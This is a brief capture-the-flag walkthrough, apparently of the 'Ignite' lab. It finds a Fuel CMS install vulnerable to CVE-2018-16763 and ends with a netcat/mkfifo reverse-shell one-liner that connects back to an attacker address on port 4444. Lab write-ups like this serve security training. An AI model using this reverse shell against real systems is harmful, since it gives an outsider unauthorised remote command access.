# Ignite

## Reconnaissance

IP Addr : 10.10.161.205

## Scanning & Enumeration

http 80 is open

### Enumerating the web app

The web app installed is fuel CMS

- vulnerable to  [CVE 2018-16763](https://www.exploit-db.com/exploits/47138)

## Exploitation

"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.2.244 4444>/tmp/f"
